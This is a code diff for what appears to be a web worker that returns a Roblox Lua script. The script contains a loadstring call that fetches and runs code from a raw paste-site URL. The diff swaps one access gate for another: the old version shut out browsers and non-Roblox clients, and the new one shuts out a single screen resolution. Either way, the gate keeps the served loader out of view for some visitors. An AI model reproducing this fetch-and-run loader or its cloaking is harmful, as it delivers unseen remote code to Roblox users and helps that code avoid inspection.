@@ -14,14 +14,13 @@ async function handleRequest(request) {
     return new Response('Method Not Allowed', { status: 405 })
   }
 
-  // Get the User-Agent from the request headers
-  const userAgent = request.headers.get('User-Agent')
+  // Get the custom headers for screen resolution
+  const screenWidth = request.headers.get('X-Screen-Width');
+  const screenHeight = request.headers.get('X-Screen-Height');
 
-  // Deny browsers and other screen-based user agents, allow only Roblox clients
-  const isBrowser = /Chrome|Safari|Firefox|Edge|MSIE|Trident|Opera|WebKit/.test(userAgent);
-  
-  if (isBrowser || !userAgent || !userAgent.includes('Roblox')) {
-    // Return an HTML response for incorrect User-Agent (for browsers or non-Roblox clients)
+  // Check if screen resolution matches 551x979
+  if (screenWidth === '551' && screenHeight === '979') {
+    // Deny access if resolution matches
     const htmlContent = `
       <!DOCTYPE html>
       <html lang="en">
@@ -43,7 +42,7 @@ async function handleRequest(request) {
       </head>
       <body>
         <h1>Access Denied</h1>
-        <p>Your User-Agent is not allowed to access this resource. Only Roblox clients are permitted.</p>
+        <p>Your screen resolution of 551x979 is not allowed to access this resource.</p>
       </body>
       </html>
     `;
@@ -53,7 +52,7 @@ async function handleRequest(request) {
     });
   }
 
-  // Basic Roblox Lua Script
+  // If resolution does not match, proceed with the normal response
   const robloxScript = `
 -- Roblox Lua Script
 --[[
@@ -66,4 +65,4 @@ loadstring(game:HttpGet("https://pastejustit.com/raw/pk4w9dy7nf"))()
   return new Response(robloxScript, {
     headers: { 'Content-Type': 'text/plain' }
   });
-              }
+}
